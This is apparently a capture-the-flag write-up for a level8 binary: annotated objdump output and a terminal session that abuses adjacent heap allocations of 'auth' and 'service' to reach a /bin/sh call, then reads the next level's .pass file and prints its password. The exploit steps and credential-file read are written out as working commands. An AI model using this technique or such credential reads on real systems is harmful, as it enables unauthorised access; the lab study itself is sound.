> ./level8
(nil), (nil)
> aaaa
(nil), (nil)
> aaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
(nil), (nil)

# Nothinig hmmmm

ojbdump -d level8

 8048575:	8b 0d b0 9a 04 08    	mov    0x8049ab0,%ecx # 0x8049ab0 <service>:	 ""
 804857b:	8b 15 ac 9a 04 08    	mov    0x8049aac,%edx # 0x8049aac <auth>:	 ""
 8048581:	b8 10 88 04 08       	mov    $0x8048810,%eax # 0x8048810:	 "%p, %p \n"
 8048586:	89 4c 24 08          	mov    %ecx,0x8(%esp)   # esp+4 = auth 
 804858a:	89 54 24 04          	mov    %edx,0x4(%esp)   # esp+8 = service # They are following each other in the stack
 804858e:	89 04 24             	mov    %eax,(%esp)
 8048591:	e8 7a fe ff ff       	call   8048410 <printf@plt>
 
 80485c1:	b8 19 88 04 08       	mov    $0x8048819,%eax # 00x8048819:	 "auth "
 80485c6:	b9 05 00 00 00       	mov    $0x5,%ecx
 80485cb:	89 d6                	mov    %edx,%esi
 80485cd:	89 c7                	mov    %eax,%edi
 80485cf:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi) # We comp & binaire
 
 8048648:	b8 1f 88 04 08       	mov    $0x804881f,%eax # 0x804881f:	 "reset"
 804864d:	b9 05 00 00 00       	mov    $0x5,%ecx
 8048652:	89 d6                	mov    %edx,%esi
 8048654:	89 c7                	mov    %eax,%edi
 8048656:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
 
 804867e:	b8 25 88 04 08       	mov    $0x8048825,%eax # 0x8048825:	 "service"
 8048683:	b9 06 00 00 00       	mov    $0x6,%ecx
 8048688:	89 d6                	mov    %edx,%esi
 804868a:	89 c7                	mov    %eax,%edi
 804868c:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
 
 80486bb:	b8 2d 88 04 08       	mov    $0x804882d,%eax # 0x804882d:	 "login"
 80486c0:	b9 05 00 00 00       	mov    $0x5,%ecx
 80486c5:	89 d6                	mov    %edx,%esi
 80486c7:	89 c7                	mov    %eax,%edi
 80486c9:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
 80486cb:	0f 97 c2             	seta   %dl
 80486ce:	0f 92 c0             	setb   %al
 80486d1:	89 d1                	mov    %edx,%ecx
 80486d3:	28 c1                	sub    %al,%cl
 80486d5:	89 c8                	mov    %ecx,%eax
 80486d7:	0f be c0             	movsbl %al,%eax
 80486da:	85 c0                	test   %eax,%eax
 80486dc:	0f 85 92 fe ff ff    	jne    8048574 <main+0x10>
 
 80486e2:	a1 ac 9a 04 08       	mov    0x8049aac,%eax
 80486e7:	8b 40 20             	mov    0x20(%eax),%eax # We check the 0x20(32) of 0x8049aac, witch is the var auth, so auth[32]
 80486ea:	85 c0                	test   %eax,%eax
 80486ec:	74 11                	je     80486ff <main+0x19b>
 80486ee:	c7 04 24 33 88 04 08 	movl   $0x8048833,(%esp) # 0x8048833:	 "/bin/sh"
 80486f5:	e8 86 fd ff ff       	call   8048480 <system@plt>
  80486fa:	e9 75 fe ff ff       	jmp    8048574 <main+0x10>
 80486ff:	a1 a0 9a 04 08       	mov    0x8049aa0,%eax
 8048704:	89 c2                	mov    %eax,%edx
 8048706:	b8 3b 88 04 08       	mov    $0x804883b,%eax # 0x804883b:	 "Password:\n"
 804870b:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804870f:	c7 44 24 08 0a 00 00 	movl   $0xa,0x8(%esp)
 8048716:	00
 8048717:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 804871e:	00
 804871f:	89 04 24             	mov    %eax,(%esp)
 8048722:	e8 29 fd ff ff       	call   8048450 <fwrite@plt>
 8048727:	e9 48 fe ff ff       	jmp    8048574 <main+0x10>
 
 # Basicly mean, if auth[32] == 0: write "Password:\n" else print "/bin/sh"
 
 # So we asign auth = "auth "
 >./level8
(nil), (nil)
> auth
0x804a008, (nil) # ok, now service
> service
0x804a008, 0x804a018
> login
Password:
# We have 16 bytes of diff between the two adress, that mean they are folloing each other in the stack,
                        so we try to reasign service why a bigger string to get auth[32] filled 
> serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a028 # Still following each other so now ...
> login 
# Wait for input
> whoami
level9
> cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
